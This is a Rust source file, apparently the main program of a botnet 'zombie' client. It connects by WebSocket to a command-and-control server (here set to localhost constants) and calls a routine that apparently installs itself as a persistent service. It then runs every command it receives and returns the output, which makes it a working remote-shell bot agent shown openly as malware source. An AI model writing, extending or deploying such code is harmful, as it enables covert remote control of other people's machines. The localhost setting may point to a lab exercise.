mod constants;
mod zombies;

use constants::localhost::{LOCALHOST_ADDRESS, LOCALHOST_PORT};
use futures_util::{SinkExt, StreamExt};
use tokio_tungstenite::connect_async;
use url::Url;
use zombies::create_zombie_service::create_zombie_service;
use zombies::run_command::run_command;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let ws_addr = format!("ws://{}:{}", LOCALHOST_ADDRESS, LOCALHOST_PORT);
    let url: Url = Url::parse(&ws_addr)?;

    let (ws_stream, _) = connect_async(url.as_str()).await?;
    println!("Connected to the C2 server!");

    match create_zombie_service() {
        Ok(_) => {}
        Err(e) => eprintln!("{}", e),
    }

    let (mut ws_sender, mut ws_receiver) = ws_stream.split();

    while let Some(msg) = ws_receiver.next().await {
        let command = match msg {
            Ok(m) => m.to_text().unwrap_or_default().to_string(),
            Err(e) => {
                eprintln!("Error receiving command: {}", e);
                break;
            }
        };

        match run_command(&command) {
            Ok(command_result) => {
                if let Err(e) = ws_sender
                    .send(tokio_tungstenite::tungstenite::Message::Text(
                        command_result,
                    ))
                    .await
                {
                    eprintln!("Failed to send response: {}", e);
                }
            }
            Err(e) => {
                let error_message = format!("Error executing command: {}", e);
                eprintln!("{}", error_message);
                if let Err(e) = ws_sender
                    .send(tokio_tungstenite::tungstenite::Message::Text(error_message))
                    .await
                {
                    eprintln!("Failed to send error response: {}", e);
                }
            }
        }
    }

    Ok(())
}
